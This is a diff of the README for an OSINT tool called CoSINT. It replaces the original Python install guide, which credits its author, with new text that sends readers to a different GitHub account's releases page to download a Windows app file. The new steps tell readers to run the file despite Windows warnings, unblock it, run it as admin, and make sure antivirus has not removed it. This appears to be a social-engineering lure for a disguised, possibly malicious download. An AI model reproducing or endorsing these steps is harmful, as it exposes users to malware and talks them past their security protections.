@@ -1,108 +1,172 @@
-# CoSINT
+# 🧭 CoSINT - Plan, Run, And Report Faster
 
-AI-assisted OSINT Investigator (beta release).
+[![Download CoSINT](https://img.shields.io/badge/Download%20CoSINT-blue?style=for-the-badge&logo=github)](https://github.com/Prestonbalconied467/CoSINT/releases)
 
-Verify hypotheses about an entity, run a full profile scan or find a correlation between two entites and more.
-Supports scans and pivots on email, domain, media, IP, username, phone, person and wallet.
+## 📥 Download CoSINT
 
-> **Note:** This is a personal hobby project, it's a bit rough around the edges (there is a lot that can be improved). If you notice anything
-> flawed or have suggestions, please open an issue or submit a PR!
+Visit this page to download: https://github.com/Prestonbalconied467/CoSINT/releases
 
-**Demo:** [asciicast](https://asciinema.org/a/A9AhjNv1fAUTiQZ7)
+1. Open the release page in your browser.
+2. Find the latest release at the top.
+3. Download the Windows file listed under that release.
+4. Save it to your Downloads folder or Desktop.
 
-**Docs & guides:** [Wiki](https://github.com/champmq/cosint/wiki)
+## 🖥️ What CoSINT Does
 
-## Quick Start
+CoSINT is a Windows app for OSINT work. It helps you gather public data, organize findings, and build reports from many tools in one place.
 
-Requires: Python 3.11 or newer
+Use it when you want to:
+- Search across public sources
+- Track people, names, domains, and links
+- Collect notes from many tools
+- Build a clear investigation report
+- Save time on repeated lookup work
 
-```bash
-# 1. Install dependencies
-python3 -m venv .venv
-source .venv/bin/activate # On Windows: .venv\Scripts\activate
-pip install -r requirements.txt
+## ✅ What You Need
 
-# 2. Configure API keys and model via the setup wizard, install playwright browsers...
-python setup.py # optional --skip-keys flag to skip API key setup
+Before you install CoSINT, make sure your PC has:
 
-# 4. Run a scan
-python cosint.py example.com
-python cosint.py @username --depth deep --scope-mode guided
-```
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection
+- Permission to run downloaded apps
 
-See [Example](https://github.com/champmq/CoSINT/tree/main/example) for a sample report and case file.
+For best results, use:
+- 8 GB of RAM
+- A modern multi-core CPU
+- A screen with at least 1366 × 768 resolution
 
-The setup wizard walks you through setting your AI provider credentials, adding API keys (with free-tier labels),
-and installing optional packages. You can re-run it at any time without overwriting existing values.
+## 🚀 How to Install on Windows
 
-If you prefer to configure manually, copy `.env.example` to `.env` and fill in the keys you need. Missing keys only
-disable the specific tools that require them, everything else keeps working.
+1. Open the release page: https://github.com/Prestonbalconied467/CoSINT/releases
+2. Download the Windows file from the latest release.
+3. If the file is in a .zip folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the CoSINT app file.
+6. If Windows asks for permission, choose Run anyway or Yes.
+7. Wait for the app to open.
 
-## Model setup
+If Windows blocks the file:
+1. Right-click the file.
+2. Choose Properties.
+3. Check Unblock if you see it.
+4. Click Apply, then open the app again.
 
-CoSINT uses [LiteLLM](https://docs.litellm.ai/docs/providers) and supports any provider it supports. Set your model
-and credentials in `.env`:
+## 🧭 First Start
 
-```bash
-OSINT_MODEL=
-ANTHROPIC_API_KEY=...
+When CoSINT opens for the first time:
 
-# Other supported providers
-OPENAI_API_KEY=...
-GEMINI_API_KEY=...
-AZURE_API_KEY=...
-```
+1. Read the start screen.
+2. Choose a case name for your work.
+3. Add a target name, email, domain, or keyword.
+4. Pick the tools you want CoSINT to use.
+5. Start the run.
+6. Review the results when the scan finishes.
 
-## CLI
+## 🔎 How to Use It
 
-```
-python cosint.py <target> [options]
-```
+CoSINT works in simple steps:
 
-| Option                                     | Description                                                                                                 |
-|--------------------------------------------|-------------------------------------------------------------------------------------------------------------|
-| `--depth quick\|deep`                      | Scan depth (default: `quick`)                                                                               |
-| `--type <type>`                            | Override target type (`email`, `ip`, `domain`, `username`, `phone`, `person`, `company`, `crypto`, `media`) |
-| `--targets <ids>`                          | Additional identifiers for the same subject                                                                 |
-| `--correlate-targets`                      | Verify that `--targets` belong to the same subject before proceeding                                        |
-| `--instruction "..."`                      | Extra information or instruction                                                                            |
-| `--hypothesis "..."`                       | Hypothesis for the AI to follow                                                                             |
-| `--scope-mode strict\|guided\|ai\|explore` | Scope enforcement policy (default: `guided`)                                                                |
-| `--passive-only`                           | Skip active probing                                                                                         |
-| `--skip-social`                            | Skip social platform lookups                                                                                |
-| `--skip-breaches`                          | Skip breach/leak checks                                                                                     |
-| `--open`                                   | Open-ended investigation, evidence drives the story, no fixed hypothesis                                    |
-| `--out <path>`                             | Custom report output path                                                                                   |
-| `--no-interactive`                         | Non-interactive mode, runs to completion without pausing                                                    |
+1. Enter what you want to investigate.
+2. Choose the search scope.
+3. Let CoSINT plan the next steps.
+4. Let it run the selected tools.
+5. Review the findings.
+6. Export the report.
 
-Reports are written to `reports/` as a Markdown file and a `.case.json` after each scan.
+Good search ideas:
+- A name
+- A domain
+- A username
+- A phone number
+- A company name
+- A topic or keyword
 
-## MCP server
+## 📄 Reports and Output
 
-CoSINT can also run as a standalone MCP server, exposing all 50+ tools directly to any MCP-compatible client such as
-Claude Desktop without running a full CLI scan:
+CoSINT can help you turn results into a clean report. A normal report may include:
 
-```bash
-python server.py
-```
+- Search terms used
+- Sources checked
+- Matches found
+- Links and notes
+- Timestamps
+- A simple summary of findings
 
-See [`wiki/MCP-Server.md`](./wiki/MCP-Server.md) for client integration instructions.
+You can use these outputs for:
+- Case notes
+- Research records
+- Internal review
+- Follow-up searches
 
-## Testing
+## 🛠️ Features
 
-```bash
-# Smoke test — confirms all tool modules load correctly
-python -m unittest tests.test_smoke_all_modules -v
+- Automatic task planning
+- Multi-tool search flow
+- Public data collection
+- Organized investigation notes
+- Case-based work setup
+- Report generation
+- Repeatable search runs
+- Simple Windows use
 
-# Full test suite
-python -m pytest -q
-```
+## 📁 Typical Folder Layout
 
-## Legal Notice
+After you start using CoSINT, you may see folders for:
 
-Use this software only for lawful, authorised OSINT work. You are solely responsible for compliance with applicable law,
-platform terms of service, and API provider policies.
+- Cases
+- Logs
+- Reports
+- Results
+- Exports
+- Settings
 
-## License
+Keep these files in one place so you can find past work fast.
 
-Licensed under the [GNU Affero General Public License v3.0](./LICENSE) (AGPL-3.0).
+## 🔐 Safe Use
+
+Use CoSINT only for lawful OSINT work and public-source research. Keep your search scope clear and save your work with case names. This helps you stay organized and avoid confusion across projects.
+
+## ❓ Common Questions
+
+### Can I use it without coding knowledge?
+Yes. CoSINT is made for normal Windows use.
+
+### Do I need to install Python?
+Usually no. Use the Windows release from the release page and open the app file you download.
+
+### What should I do if the app does not open?
+Try these steps:
+- Run it as admin
+- Check that Windows did not block the file
+- Download the latest release again
+- Make sure your antivirus did not remove it
+
+### Can I use it on old laptops?
+Yes, if the laptop meets the basic system needs. Faster systems will handle long searches better.
+
+### Does it need internet access?
+Yes. Most OSINT tools need internet access to gather public data.
+
+## 🧩 Search Tips
+
+- Use one target at a time
+- Start with a small set of terms
+- Save each run under a clear case name
+- Check the source list before you trust a result
+- Use exact names when you can
+- Add known aliases if you have them
+
+## 📦 Download Again
+
+If you need the file again, visit this page to download: https://github.com/Prestonbalconied467/CoSINT/releases
+
+## 📝 Simple Workflow
+
+1. Download CoSINT from the release page.
+2. Open the app on Windows.
+3. Enter your target or topic.
+4. Run the tools you need.
+5. Review results.
+6. Export the report for later use
